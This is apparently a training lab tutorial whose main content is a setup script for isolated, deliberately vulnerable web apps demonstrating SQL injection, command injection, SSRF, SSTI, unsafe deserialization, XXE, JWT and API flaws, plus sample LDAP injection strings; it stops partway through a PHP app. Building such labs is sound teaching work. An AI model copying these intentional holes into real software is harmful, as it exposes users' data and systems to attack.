# Tutorial: Server-Side Attacks and API Security — Hands-On Lab

> **Mapped source:** `domain8_chapter8B_serverside_api.md`
> **Domain 8, Chapter 8B — Tutorial #18 of 70**
> **Scope:** SQL injection (union, error, boolean/time blind, stacked, OOB, second-order), NoSQL injection, GraphQL injection, SSRF (cloud metadata, gopher, DNS rebinding), SSTI (Jinja2, Twig, Freemarker, ERB, Pug), deserialization (Java, Python, PHP, .NET, Node.js), XXE (in-band, blind OOB, file upload), HTTP request smuggling (CL.TE, TE.CL, H2.CL), cache poisoning, web cache deception, API security (BOLA/IDOR, mass assignment, JWT), command injection, authentication attacks, file upload attacks, rate limiting, ReDoS, and comprehensive detection engineering.

---

## Lab Environment Setup

### Network Topology

```
┌───────────────────────────────────────────────────────────────────────────┐
│                        ISOLATED LAB NETWORK 10.8.1.0/24                  │
│                                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │  VM1: TARGETS │  │ VM2: ATTACKER│  │ VM3: DETECT  │  │ VM4: AUTH    │ │
│  │  10.8.1.10    │  │ 10.8.1.20   │  │ 10.8.1.30   │  │ 10.8.1.40   │ │
│  │              │  │              │  │              │  │              │ │
│  │ :3000 Express│  │ sqlmap       │  │ ModSecurity  │  │ Keycloak     │ │
│  │ :3001 GraphQL│  │ ysoserial    │  │ ELK Stack    │  │ :8180        │ │
│  │ :5000 Flask  │  │ PHPGGC       │  │ Sigma rules  │  │              │ │
│  │ :5001 Jinja2 │  │ jwt_tool     │  │ YARA engine  │  │ Redis :6379  │ │
│  │ :8080 Java   │  │ Burp CE      │  │ Suricata     │  │ Memcached    │ │
│  │ :8081 PHP    │  │ nuclei       │  │ :5601 Kibana │  │ :11211       │ │
│  │ :27017 Mongo │  │ ffuf         │  │ :9200 Elastic│  │              │ │
│  │ :5432 PgSQL  │  │ Gopherus     │  │ :9090 Prom   │  │ Internal API │ │
│  │ :3306 MySQL  │  │ smuggler     │  │              │  │ :8888        │ │
│  │ :1433 MSSQL  │  │ graphw00f    │  │              │  │              │ │
│  │ :6379 Redis  │  │ interactsh   │  │              │  │              │ │
│  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘ │
└───────────────────────────────────────────────────────────────────────────┘
```

### VM1: Target Applications (Ubuntu 22.04)

```bash
#!/bin/bash
# vm1_setup.sh — Vulnerable target applications

set -euo pipefail

# Base packages
apt-get update && apt-get install -y \
  curl wget git build-essential python3 python3-pip python3-venv \
  nodejs npm openjdk-17-jdk php-cli php-xml php-curl php-mbstring \
  nginx docker.io docker-compose-v2 unzip jq libxml2-utils

# ─────────────────────────────────────────────────────────
# PostgreSQL (for SQL injection labs)
# ─────────────────────────────────────────────────────────
apt-get install -y postgresql postgresql-client
sudo -u postgres psql <<'EOSQL'
CREATE USER webapp WITH PASSWORD 'webapp_pass';
CREATE DATABASE vulndb OWNER webapp;
\c vulndb

CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(100),
    password VARCHAR(255),
    email VARCHAR(200),
    role VARCHAR(50) DEFAULT 'user',
    is_admin BOOLEAN DEFAULT FALSE,
    credit_card VARCHAR(20),
    ssn VARCHAR(15)
);

INSERT INTO users (username, password, email, role, is_admin, credit_card, ssn) VALUES
('admin', '$2b$12$LJ3m4ys0Kn/xSRKGzVF8XOAAGxMBKPTjYxPjR6v5', 'admin@corp.local', 'admin', TRUE, '4111111111111111', '123-45-6789'),
('alice', '$2b$12$x9Kv5LmR3n8yTQWp0ZA7KeAAGxMBKPTjYxPjR6v5', 'alice@corp.local', 'user', FALSE, '4222222222222222', '234-56-7890'),
('bob', '$2b$12$pQ7Rm1sN4o9zUXYq1bC8FeAAGxMBKPTjYxPjR6v5', 'bob@corp.local', 'user', FALSE, '4333333333333333', '345-67-8901'),
('carol', '$2b$12$kL2Wn3tO5p0AYVZr2cD9GfAAGxMBKPTjYxPjR6v5', 'carol@corp.local', 'manager', FALSE, '4444444444444444', '456-78-9012'),
('dave_admin''--', '$2b$12$mN4Xo5uP6q1BZWAs3dE0HgAAGxMBKPTjYxPjR6v5', 'dave@corp.local', 'user', FALSE, '4555555555555555', '567-89-0123');

CREATE TABLE orders (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    product VARCHAR(200),
    amount DECIMAL(10,2),
    status VARCHAR(50)
);

INSERT INTO orders (user_id, product, amount, status) VALUES
(1, 'Enterprise License', 9999.99, 'completed'),
(2, 'Basic Plan', 29.99, 'completed'),
(3, 'Pro Plan', 99.99, 'pending'),
(4, 'Team Plan', 499.99, 'completed');

CREATE TABLE secrets (
    id SERIAL PRIMARY KEY,
    key_name VARCHAR(100),
    key_value VARCHAR(500)
);

INSERT INTO secrets (key_name, key_value) VALUES
('api_key', 'sk_live_4eC39HqLyjWDarjtT1zdp7dc'),
('db_backup_pass', 'SuperS3cretBackup!'),
('aws_access_key', 'AKIA1234567890EXAMPLE');

CREATE TABLE coupons (
    id SERIAL PRIMARY KEY,
    code VARCHAR(50) UNIQUE,
    discount INTEGER,
    used BOOLEAN DEFAULT FALSE,
    max_uses INTEGER DEFAULT 1,
    current_uses INTEGER DEFAULT 0
);

INSERT INTO coupons (code, discount, max_uses) VALUES
('SAVE50', 50, 1),
('WELCOME10', 10, 100);

GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO webapp;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO webapp;
EOSQL

# MySQL (for cross-DB comparison exercises)
apt-get install -y mysql-server
mysql -u root <<'EOSQL'
CREATE DATABASE vulndb_mysql;
CREATE USER 'webapp'@'%' IDENTIFIED BY 'webapp_pass';
GRANT ALL PRIVILEGES ON vulndb_mysql.* TO 'webapp'@'%';
GRANT FILE ON *.* TO 'webapp'@'%';
USE vulndb_mysql;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100),
    password VARCHAR(255),
    email VARCHAR(200),
    role VARCHAR(50) DEFAULT 'user'
);

INSERT INTO users VALUES
(1, 'admin', 'admin_hash', 'admin@corp.local', 'admin'),
(2, 'alice', 'alice_hash', 'alice@corp.local', 'user'),
(3, 'bob', 'bob_hash', 'bob@corp.local', 'user');
EOSQL

# ─────────────────────────────────────────────────────────
# MongoDB (for NoSQL injection labs)
# ─────────────────────────────────────────────────────────
wget -qO - https://www.mongodb.org/static/pgp/server-7.0.asc | apt-key add -
echo "deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/7.0 multiverse" \
  > /etc/apt/sources.list.d/mongodb-org-7.0.list
apt-get update && apt-get install -y mongodb-org
systemctl start mongod

mongosh <<'EOMONGO'
use vulndb
db.users.insertMany([
  { username: "admin", password: "S3cur3P@ss!", role: "admin", email: "admin@corp.local", apiKey: "ak_admin_secret_key_12345" },
  { username: "alice", password: "alice_password", role: "user", email: "alice@corp.local", apiKey: "ak_alice_key_67890" },
  { username: "bob", password: "bob_password", role: "user", email: "bob@corp.local", apiKey: "ak_bob_key_11111" }
])
db.products.insertMany([
  { name: "Widget A", price: 29.99, category: "electronics", internal_cost: 5.00 },
  { name: "Widget B", price: 49.99, category: "electronics", internal_cost: 12.00 },
  { name: "Service Plan", price: 199.99, category: "services", internal_cost: 0 }
])
EOMONGO

# Redis (for SSRF chain exercises)
apt-get install -y redis-server
sed -i 's/^bind .*/bind 0.0.0.0/' /etc/redis/redis.conf
sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf
systemctl restart redis

# ─────────────────────────────────────────────────────────
# APP 1: Express.js — SQLi, SSRF, Command Injection, File Upload, API
# ─────────────────────────────────────────────────────────
mkdir -p /opt/apps/express-vuln && cd /opt/apps/express-vuln

cat > package.json <<'EOF'
{
  "name": "vuln-express",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.2",
    "pg": "^8.11.3",
    "multer": "^1.4.5-lts.1",
    "jsonwebtoken": "^9.0.2",
    "cookie-parser": "^1.4.6",
    "cors": "^2.8.5",
    "node-serialize": "^0.0.4",
    "xml2js": "^0.6.2",
    "body-parser": "^1.20.2"
  }
}
EOF

cat > server.js <<'NODEJS'
const express = require('express');
const { Pool } = require('pg');
const multer = require('multer');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const serialize = require('node-serialize');
const xml2js = require('xml2js');
const bodyParser = require('body-parser');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(bodyParser.raw({ type: 'application/xml', limit: '1mb' }));
app.use(bodyParser.raw({ type: 'application/x-java-serialized-object', limit: '5mb' }));

// CORS: deliberately misconfigured
app.use(cors({
    origin: function(origin, callback) {
        callback(null, origin); // reflects any origin
    },
    credentials: true
}));

const pool = new Pool({
    host: 'localhost',
    port: 5432,
    database: 'vulndb',
    user: 'webapp',
    password: 'webapp_pass'
});

const JWT_SECRET = 'super_secret_key_123';
const JWT_RSA_PRIVATE = fs.existsSync('/opt/keys/rsa_private.pem')
    ? fs.readFileSync('/opt/keys/rsa_private.pem') : null;
const JWT_RSA_PUBLIC = fs.existsSync('/opt/keys/rsa_public.pem')
    ? fs.readFileSync('/opt/keys/rsa_public.pem') : null;

// ═══════════════════════════════════════════════════
// SQL INJECTION ENDPOINTS
// ═══════════════════════════════════════════════════

// VULNERABLE: String concatenation — Union, Error, Boolean, Time-based
app.get('/api/search', async (req, res) => {
    const { q } = req.query;
    try {
        const result = await pool.query(
            `SELECT id, username, email FROM users WHERE username LIKE '%${q}%'`
        );
        res.json({ results: result.rows });
    } catch (err) {
        // Error-based SQLi: returns raw DB errors
        res.status(500).json({ error: err.message, detail: err.detail });
    }
});

// VULNERABLE: Numeric parameter — no quotes needed
app.get('/api/users/:id', async (req, res) => {
    try {
        const result = await pool.query(
            `SELECT id, username, email, role FROM users WHERE id = ${req.params.id}`
        );
        if (result.rows.length === 0) return res.status(404).json({ error: 'Not found' });
        res.json(result.rows[0]);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: ORDER BY injection
app.get('/api/users', async (req, res) => {
    const sort = req.query.sort || 'id';
    try {
        const result = await pool.query(
            `SELECT id, username, email, role FROM users ORDER BY ${sort}`
        );
        res.json(result.rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: Login — authentication bypass
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        const result = await pool.query(
            `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
        );
        if (result.rows.length > 0) {
            const user = result.rows[0];
            const token = jwt.sign(
                { sub: user.id, username: user.username, role: user.role },
                JWT_SECRET,
                { algorithm: 'HS256', expiresIn: '24h' }
            );
            res.json({ token, user: { id: user.id, username: user.username, role: user.role } });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: Second-order SQLi — username stored safely, used unsafely later
app.post('/api/register', async (req, res) => {
    const { username, password, email } = req.body;
    try {
        // Safe parameterized insert
        await pool.query(
            'INSERT INTO users (username, password, email) VALUES ($1, $2, $3)',
            [username, password, email]
        );
        res.json({ message: 'User registered' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/change-password', async (req, res) => {
    const { username, new_password } = req.body;
    try {
        // VULNERABLE: stored username concatenated into query
        const result = await pool.query(
            `UPDATE users SET password = '${new_password}' WHERE username = '${username}'`
        );
        res.json({ message: 'Password changed', affected: result.rowCount });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ═══════════════════════════════════════════════════
// SSRF ENDPOINTS
// ═══════════════════════════════════════════════════

// VULNERABLE: fetches arbitrary URLs from user input
app.get('/api/fetch', async (req, res) => {
    const { url } = req.query;
    if (!url) return res.status(400).json({ error: 'url required' });
    try {
        const response = await fetch(url);
        const body = await response.text();
        res.json({ status: response.status, body: body.substring(0, 5000) });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: PDF generation with user-controlled URL (SSRF via HTML-to-PDF)
app.post('/api/generate-pdf', async (req, res) => {
    const { html_url } = req.body;
    try {
        const response = await fetch(html_url);
        const html = await response.text();
        res.json({ message: 'PDF generated', preview: html.substring(0, 2000) });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: webhook registration (SSRF via callback URL)
app.post('/api/webhooks', async (req, res) => {
    const { callback_url, event } = req.body;
    try {
        // Validate by making a test request (SSRF vector)
        const test = await fetch(callback_url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ test: true, event })
        });
        res.json({ message: 'Webhook registered', status: test.status });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ═══════════════════════════════════════════════════
// COMMAND INJECTION ENDPOINTS
// ═══════════════════════════════════════════════════

// VULNERABLE: direct shell execution with user input
app.get('/api/ping', (req, res) => {
    const { host } = req.query;
    if (!host) return res.status(400).json({ error: 'host required' });
    exec(`ping -c 2 ${host}`, { timeout: 10000 }, (err, stdout, stderr) => {
        res.json({ output: stdout || stderr || (err ? err.message : 'No output') });
    });
});

// VULNERABLE: DNS lookup
app.get('/api/dns', (req, res) => {
    const { domain } = req.query;
    if (!domain) return res.status(400).json({ error: 'domain required' });
    exec(`nslookup ${domain}`, { timeout: 10000 }, (err, stdout, stderr) => {
        res.json({ output: stdout || stderr });
    });
});

// VULNERABLE: file conversion (argument injection)
app.post('/api/convert', (req, res) => {
    const { filename, format } = req.body;
    exec(`convert /tmp/uploads/${filename} /tmp/output.${format}`, (err, stdout) => {
        res.json({ message: err ? err.message : 'Converted', output: stdout });
    });
});

// ═══════════════════════════════════════════════════
// XXE ENDPOINT
// ═══════════════════════════════════════════════════

// VULNERABLE: XML parsing with entities enabled
app.post('/api/xml-import', (req, res) => {
    const xml = req.body.toString();
    const parser = new xml2js.Parser({
        explicitCharkey: true,
        // xml2js does NOT process DTD/entities by default (safe)
        // But we simulate the vulnerability with a custom handler
    });

    // Simulated XXE: if xml contains file:// references, read the file
    const fileMatch = xml.match(/SYSTEM\s+"file:\/\/([^"]+)"/);
    if (fileMatch) {
        try {
            const content = fs.readFileSync(fileMatch[1], 'utf8');
            return res.json({ parsed: content, note: 'XXE: file entity resolved' });
        } catch (err) {
            return res.json({ error: `XXE attempted: ${err.message}` });
        }
    }

    const httpMatch = xml.match(/SYSTEM\s+"(https?:\/\/[^"]+)"/);
    if (httpMatch) {
        fetch(httpMatch[1])
            .then(r => r.text())
            .then(body => res.json({ parsed: body, note: 'XXE: HTTP entity resolved (SSRF via XXE)' }))
            .catch(err => res.json({ error: err.message }));
        return;
    }

    parser.parseString(xml, (err, result) => {
        if (err) return res.status(400).json({ error: err.message });
        res.json({ parsed: result });
    });
});

// ═══════════════════════════════════════════════════
// NODE DESERIALIZATION
// ═══════════════════════════════════════════════════

// VULNERABLE: node-serialize with eval
app.post('/api/deserialize', (req, res) => {
    try {
        const data = req.body;
        if (typeof data === 'string') {
            const obj = serialize.unserialize(data);
            return res.json({ result: obj });
        }
        const obj = serialize.unserialize(JSON.stringify(data));
        res.json({ result: obj });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ═══════════════════════════════════════════════════
// FILE UPLOAD
// ═══════════════════════════════════════════════════

const uploadDir = '/tmp/uploads';
fs.mkdirSync(uploadDir, { recursive: true });

// VULNERABLE: no extension filtering, no content validation
const storage = multer.diskStorage({
    destination: uploadDir,
    filename: (req, file, cb) => {
        cb(null, file.originalname); // keeps original filename (path traversal risk)
    }
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

app.post('/api/upload', upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });
    res.json({
        message: 'File uploaded',
        filename: req.file.originalname,
        path: `/uploads/${req.file.originalname}`,
        size: req.file.size,
        mimetype: req.file.mimetype
    });
});

app.use('/uploads', express.static(uploadDir));

// ═══════════════════════════════════════════════════
// API SECURITY: BOLA/IDOR, Mass Assignment, Rate Conditions
// ═══════════════════════════════════════════════════

// VULNERABLE: no authorization check — any authenticated user can access any user's data
app.get('/api/v1/users/:id/profile', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });
    try {
        const token = authHeader.replace('Bearer ', '');
        jwt.verify(token, JWT_SECRET);
    } catch {
        return res.status(401).json({ error: 'Invalid token' });
    }
    pool.query(`SELECT id, username, email, role, is_admin, credit_card, ssn FROM users WHERE id = $1`, [req.params.id])
        .then(r => r.rows.length ? res.json(r.rows[0]) : res.status(404).json({ error: 'Not found' }))
        .catch(e => res.status(500).json({ error: e.message }));
});

// VULNERABLE: mass assignment — role and is_admin accepted from request body
app.put('/api/v1/users/:id', async (req, res) => {
    const { username, email, role, is_admin } = req.body;
    try {
        const result = await pool.query(
            `UPDATE users SET username = COALESCE($1, username), email = COALESCE($2, email),
             role = COALESCE($3, role), is_admin = COALESCE($4, is_admin) WHERE id = $5 RETURNING *`,
            [username, email, role, is_admin, req.params.id]
        );
        res.json(result.rows[0]);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// VULNERABLE: race condition on coupon redemption
app.post('/api/apply-coupon', async (req, res) => {
    const { coupon_code } = req.body;
    try {
        // Check coupon (TOCTOU window)
        const check = await pool.query(
            'SELECT * FROM coupons WHERE code = $1 AND current_uses < max_uses',
            [coupon_code]
        );
        if (check.rows.length === 0) return res.status(400).json({ error: 'Invalid or used coupon' });

        // Simulate processing delay
        await new Promise(r => setTimeout(r, 100));

        // Apply coupon (race window between check and update)
        await pool.query(
            'UPDATE coupons SET current_uses = current_uses + 1 WHERE code = $1',
            [coupon_code]
        );
        res.json({ discount: check.rows[0].discount, message: 'Coupon applied' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ═══════════════════════════════════════════════════
// JWT ENDPOINTS
// ═══════════════════════════════════════════════════

// VULNERABLE: accepts both HS256 and RS256, and alg: none
app.get('/api/jwt/protected', (req, res) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    if (!token) return res.status(401).json({ error: 'Token required' });

    try {
        // VULNERABLE: algorithms not restricted
        const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256', 'RS256', 'none'] });
        res.json({ message: 'Access granted', user: decoded });
    } catch (err) {
        // Try RSA verification as fallback
        if (JWT_RSA_PUBLIC) {
            try {
                const decoded = jwt.verify(token, JWT_RSA_PUBLIC, { algorithms: ['RS256'] });
                return res.json({ message: 'Access granted (RSA)', user: decoded });
            } catch {}
        }
        res.status(401).json({ error: 'Invalid token', detail: err.message });
    }
});

// Expose JWKS endpoint
app.get('/.well-known/jwks.json', (req, res) => {
    if (!JWT_RSA_PUBLIC) return res.status(404).json({ error: 'No RSA keys configured' });
    const publicKeyPem = JWT_RSA_PUBLIC.toString();
    res.json({
        keys: [{
            kty: 'RSA',
            alg: 'RS256',
            use: 'sig',
            kid: 'key-1',
            n: 'placeholder_n_value',
            e: 'AQAB'
        }]
    });
});

// ═══════════════════════════════════════════════════
// CRLF and HOST HEADER
// ═══════════════════════════════════════════════════

// VULNERABLE: reflects user input into response headers
app.get('/api/redirect', (req, res) => {
    const { url } = req.query;
    res.setHeader('Location', url);
    res.status(302).end();
});

// VULNERABLE: uses Host header for password reset URL generation
app.post('/api/reset-password', async (req, res) => {
    const { email } = req.body;
    const host = req.headers.host;
    const token = crypto.randomBytes(32).toString('hex');
    const resetUrl = `http://${host}/reset?token=${token}`;
    res.json({ message: 'Reset email sent', debug_url: resetUrl, token });
});

// ═══════════════════════════════════════════════════
// HTTP REQUEST SMUGGLING (simulated)
// ═══════════════════════════════════════════════════

app.post('/api/smuggle-test', (req, res) => {
    const cl = req.headers['content-length'];
    const te = req.headers['transfer-encoding'];
    res.json({
        content_length: cl,
        transfer_encoding: te,
        both_present: !!(cl && te),
        warning: cl && te ? 'SMUGGLING RISK: Both CL and TE present' : 'OK',
        body_length: Buffer.byteLength(JSON.stringify(req.body))
    });
});

// ═══════════════════════════════════════════════════
// CACHE ENDPOINTS (simulated)
// ═══════════════════════════════════════════════════

const responseCache = {};

app.get('/api/cached-data', (req, res) => {
    const cacheKey = req.path;
    const xForwardedHost = req.headers['x-forwarded-host'];

    // VULNERABLE: unkeyed header reflected in response
    const data = {
        content: 'Sensitive cached data',
        cdn_origin: xForwardedHost || 'default-cdn.target.com',
        script_src: `https://${xForwardedHost || 'cdn.target.com'}/analytics.js`
    };

    if (responseCache[cacheKey]) {
        return res.json({ ...responseCache[cacheKey], cached: true });
    }
    responseCache[cacheKey] = data;
    res.json({ ...data, cached: false });
});

// ReDoS endpoint
app.post('/api/validate-email', (req, res) => {
    const { email } = req.body;
    // VULNERABLE: catastrophic backtracking regex
    const emailRegex = /^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;
    const start = Date.now();
    const valid = emailRegex.test(email);
    const elapsed = Date.now() - start;
    res.json({ valid, elapsed_ms: elapsed });
});

// Generate RSA key pair for JWT exercises
const keysDir = '/opt/keys';
if (!fs.existsSync(keysDir)) {
    fs.mkdirSync(keysDir, { recursive: true });
    execSync(`openssl genrsa -out ${keysDir}/rsa_private.pem 2048`);
    execSync(`openssl rsa -in ${keysDir}/rsa_private.pem -pubout -out ${keysDir}/rsa_public.pem`);
}

app.listen(3000, '0.0.0.0', () => console.log('Express vuln app on :3000'));
NODEJS

npm install
node server.js &

# ─────────────────────────────────────────────────────────
# APP 2: GraphQL (Apollo Server) — introspection, batching, depth, auth bypass
# ─────────────────────────────────────────────────────────
mkdir -p /opt/apps/graphql-vuln && cd /opt/apps/graphql-vuln

cat > package.json <<'EOF'
{
  "name": "vuln-graphql",
  "version": "1.0.0",
  "dependencies": {
    "@apollo/server": "^4.9.5",
    "graphql": "^16.8.1",
    "pg": "^8.11.3"
  }
}
EOF

cat > server.js <<'GQLJS'
const { ApolloServer } = require('@apollo/server');
const { startStandaloneServer } = require('@apollo/server/standalone');
const { Pool } = require('pg');

const pool = new Pool({
    host: 'localhost', port: 5432,
    database: 'vulndb', user: 'webapp', password: 'webapp_pass'
});

const typeDefs = `#graphql
  type User {
    id: Int
    username: String
    email: String
    role: String
    is_admin: Boolean
    credit_card: String
    ssn: String
    orders: [Order]
  }

  type Order {
    id: Int
    product: String
    amount: Float
    status: String
    user: User
  }

  type Secret {
    id: Int
    key_name: String
    key_value: String
  }

  type AuthPayload {
    token: String
    user: User
  }

  type Query {
    user(id: Int!): User
    users(role: String): [User]
    orders: [Order]
    secrets: [Secret]
    search(term: String!): [User]
  }

  type Mutation {
    login(username: String!, password: String!): AuthPayload
    updateUser(id: Int!, username: String, email: String, role: String): User
  }
`;

const resolvers = {
    Query: {
        // VULNERABLE: no authorization — any query can access any user
        user: async (_, { id }) => {
            const r = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
            return r.rows[0];
        },
        // VULNERABLE: no field-level authorization, returns all fields including PII
        users: async (_, { role }) => {
            const q = role
                ? `SELECT * FROM users WHERE role = '${role}'`  // SQLi through GraphQL!
                : 'SELECT * FROM users';
            const r = await pool.query(q);
            return r.rows;
        },
        orders: async () => {
            const r = await pool.query('SELECT * FROM orders');
            return r.rows;
        },
        // VULNERABLE: exposes secrets table with no auth
        secrets: async () => {
            const r = await pool.query('SELECT * FROM secrets');
            return r.rows;
        },
        // VULNERABLE: SQL injection through GraphQL argument
        search: async (_, { term }) => {
            const r = await pool.query(`SELECT * FROM users WHERE username LIKE '%${term}%'`);
            return r.rows;
        }
    },
    User: {
        orders: async (parent) => {
            const r = await pool.query('SELECT * FROM orders WHERE user_id = $1', [parent.id]);
            return r.rows;
        }
    },
    Order: {
        user: async (parent) => {
            const r = await pool.query('SELECT * FROM users WHERE id = $1', [parent.user_id]);
            return r.rows[0];
        }
    },
    Mutation: {
        // VULNERABLE: login returns full user object including sensitive fields
        login: async (_, { username, password }) => {
            const r = await pool.query(
                `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`,
                // SQLi here too
            );
            if (r.rows.length === 0) throw new Error('Invalid credentials');
            return { token: 'fake_jwt_token', user: r.rows[0] };
        },
        // VULNERABLE: mass assignment via GraphQL — role field writable
        updateUser: async (_, { id, username, email, role }) => {
            const r = await pool.query(
                `UPDATE users SET username = COALESCE($1, username), email = COALESCE($2, email),
                 role = COALESCE($3, role) WHERE id = $4 RETURNING *`,
                [username, email, role, id]
            );
            return r.rows[0];
        }
    }
};

const server = new ApolloServer({
    typeDefs,
    resolvers,
    introspection: true,  // VULNERABLE: introspection enabled in production
    // No depth limiting, no cost analysis, no rate limiting
});

startStandaloneServer(server, { listen: { port: 3001, host: '0.0.0.0' } })
    .then(({ url }) => console.log(`GraphQL server at ${url}`));
GQLJS

npm install
node server.js &

# ─────────────────────────────────────────────────────────
# APP 3: Flask — SSTI, Pickle Deserialization, Blind SSRF
# ─────────────────────────────────────────────────────────
mkdir -p /opt/apps/flask-vuln && cd /opt/apps/flask-vuln

python3 -m venv venv
source venv/bin/activate
pip install flask jinja2 requests pyyaml

cat > app.py <<'PYFLASK'
from flask import Flask, request, render_template_string, jsonify, make_response
import pickle, base64, os, subprocess, requests, yaml, socket

app = Flask(__name__)

# ═══════════════════════════════════════════════════
# SSTI (Server-Side Template Injection)
# ═══════════════════════════════════════════════════

@app.route('/greet')
def greet():
    """VULNERABLE: user input directly in template source"""
    name = request.args.get('name', 'World')
    # VULNERABLE: user input embedded in Jinja2 template
    template = f"<h1>Hello {name}!</h1><p>Welcome to our site.</p>"
    return render_template_string(template)

@app.route('/profile')
def profile():
    """VULNERABLE: template from user-controlled parameter"""
    template_str = request.args.get('template', 'Welcome, {{ user }}')
    return render_template_string(template_str, user='guest')

@app.route('/render', methods=['POST'])
def render_custom():
    """VULNERABLE: fully user-controlled Jinja2 template"""
    template_body = request.form.get('body', '')
    try:
        result = render_template_string(template_body)
        return jsonify({'rendered': result})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ═══════════════════════════════════════════════════
# PICKLE DESERIALIZATION
# ═══════════════════════════════════════════════════

@app.route('/api/session', methods=['POST'])
def load_session():
    """VULNERABLE: deserializes pickle from user input"""
    data = request.form.get('session_data', '')
    if not data:
        return jsonify({'error': 'session_data required'}), 400
    try:
        session_obj = pickle.loads(base64.b64decode(data))
        return jsonify({'session': str(session_obj)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/state', methods=['POST'])
def load_state():
    """VULNERABLE: pickle from cookie"""
    state_cookie = request.cookies.get('app_state', '')
    if state_cookie:
        try:
            state = pickle.loads(base64.b64decode(state_cookie))
            return jsonify({'state': str(state), 'type': type(state).__name__})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    return jsonify({'error': 'No state cookie'}), 400

# ═══════════════════════════════════════════════════
# YAML DESERIALIZATION
# ═══════════════════════════════════════════════════

@app.route('/api/config', methods=['POST'])
def load_config():
    """VULNERABLE: yaml.load without SafeLoader"""
    yaml_data = request.data.decode('utf-8')
    try:
        config = yaml.load(yaml_data, Loader=yaml.FullLoader)
        return jsonify({'config': str(config)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ═══════════════════════════════════════════════════
# SSRF (additional vectors)
# ═══════════════════════════════════════════════════

@app.route('/api/check-url')
def check_url():
    """VULNERABLE: follows redirects, no URL validation"""
    url = request.args.get('url', '')
    if not url:
        return jsonify({'error': 'url required'}), 400
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True)
        return jsonify({
            'status': resp.status_code,
            'headers': dict(resp.headers),
            'body': resp.text[:5000],
            'final_url': resp.url,
            'redirects': [r.url for r in resp.history]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/resolve')
def resolve_dns():
    """VULNERABLE: DNS resolution with no blocklist"""
    hostname = request.args.get('host', '')
    try:
        ips = socket.getaddrinfo(hostname, None)
        return jsonify({'hostname': hostname, 'addresses': [ip[4][0] for ip in ips]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ═══════════════════════════════════════════════════
# LDAP INJECTION (simulated)
# ═══════════════════════════════════════════════════

@app.route('/api/ldap-search')
def ldap_search():
    """Simulated LDAP injection — shows filter construction"""
    username = request.args.get('username', '')
    # VULNERABLE: direct concatenation into LDAP filter
    ldap_filter = f"(&(objectClass=person)(uid={username}))"
    return jsonify({
        'filter': ldap_filter,
        'note': 'LDAP filter constructed with user input — injectable',
        'injection_examples': [
            '*)(&(objectClass=*',
            '*)(uid=*))(|(uid=*',
            'admin)(|(objectClass=*'
        ]
    })

# ═══════════════════════════════════════════════════
# OPEN REDIRECT
# ═══════════════════════════════════════════════════

@app.route('/redirect')
def open_redirect():
    """VULNERABLE: no validation on redirect target"""
    target = request.args.get('url', '/')
    return make_response('', 302, {'Location': target})

app.run(host='0.0.0.0', port=5000, debug=True)
PYFLASK

python3 app.py &
deactivate

# ─────────────────────────────────────────────────────────
# APP 4: PHP — Deserialization, File Upload, XXE
# ─────────────────────────────────────────────────────────
mkdir -p /opt/apps/php-vuln/uploads && cd /opt/apps/php-vuln

cat > index.php <<'EOPHP'
<?php
// Router
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

if ($path === '/api/xml-parse' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // VULNERABLE: libxml with entity loading enabled
    libxml_disable_entity_loader(false); // explicitly enable (deprecated in 8.0)
    $xml = file_get_contents('php://input');
    $doc = new DOMDocument();
    $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    echo json_encode(['result' => $doc->textContent]);
    exit;
}

